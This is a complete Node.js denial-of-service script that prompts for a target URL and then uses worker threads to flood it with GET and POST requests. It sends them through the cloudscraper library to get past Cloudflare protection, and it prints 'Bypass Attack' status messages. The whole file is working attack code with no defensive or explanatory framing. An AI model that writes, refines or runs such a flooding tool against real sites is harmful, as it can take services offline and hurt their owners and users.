const cloudscraper = require('cloudscraper');
const { Worker, isMainThread, parentPort, workerData } = require('worker_threads');
const readline = require('readline');

if (isMainThread) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    rl.question('Enter target URL: ', (targetUrl) => {
        rl.question('Enter attack duration in seconds (e.g., 60): ', (duration) => {
            rl.question('Enter requests per second (e.g., 3000): ', (requestsPerSecond) => {
                rl.question('Enter number of threads: ', (numThreads) => {
                    rl.question('Enter message for POST requests: ', (postMessage) => {
                        const durationInt = parseInt(duration, 10);
                        const requestsPerSecondInt = parseInt(requestsPerSecond, 10);
                        const numThreadsInt = parseInt(numThreads, 10);

                        if (isNaN(requestsPerSecondInt) || isNaN(durationInt) || isNaN(numThreadsInt) || 
                            requestsPerSecondInt <= 0 || durationInt <= 0 || numThreadsInt <= 0) {
                            console.error('Invalid input. Please enter positive numbers for duration, requests per second, and number of threads.');
                            rl.close();
                            return;
                        }

                        rl.close();
                        startAttack(targetUrl, durationInt, requestsPerSecondInt, numThreadsInt, postMessage);
                    });
                });
            });
        });
    });
} else {
    const { target, duration, ratePerThread, postMessage } = workerData;
    const endTime = Date.now() + duration * 1000;
    let requestCount = 0;

    const sendRequests = async () => {
        while (Date.now() < endTime && requestCount < 500000) {
            try {
                const promises = [];
                for (let i = 0; i < ratePerThread; i++) {
                    promises.push(
                        cloudscraper.get(target)
                            .then(() => { requestCount++; })
                            .catch(() => { requestCount++; })
                    );
                    promises.push(
                        cloudscraper.post(target, { message: postMessage })
                            .then(() => { requestCount++; })
                            .catch(() => { requestCount++; })
                    );
                }
                await Promise.all(promises);
                parentPort.postMessage(ratePerThread * 2); // Sending both GET and POST requests
            } catch (error) {
                console.error(`Error: ${error.message}`);
            }
        }
        parentPort.postMessage(requestCount);
        parentPort.close();
    };

    sendRequests();
}

function startAttack(target, duration, requestsPerSecond, numThreads, postMessage) {
    console.log('Bypass Attack Started!');
    let totalRequestCount = 0;

    const updateCount = (increment) => {
        totalRequestCount += increment;
        console.log(`Total Requests sent: ${totalRequestCount}`);
    };

    const workerPromises = [];

    for (let i = 0; i < numThreads; i++) {
        workerPromises.push(new Promise((resolve, reject) => {
            const worker = new Worker(__filename, {
                workerData: { target, duration, ratePerThread: requestsPerSecond / numThreads, postMessage }
            });
            worker.on('message', updateCount);
            worker.on('error', reject);
            worker.on('exit', resolve);
        }));
    }

    Promise.all(workerPromises).then(() => {
        console.log(`Bypass Attack finished. Total requests sent: ${totalRequestCount}`);
        process.exit(0);
    });
                            }
        
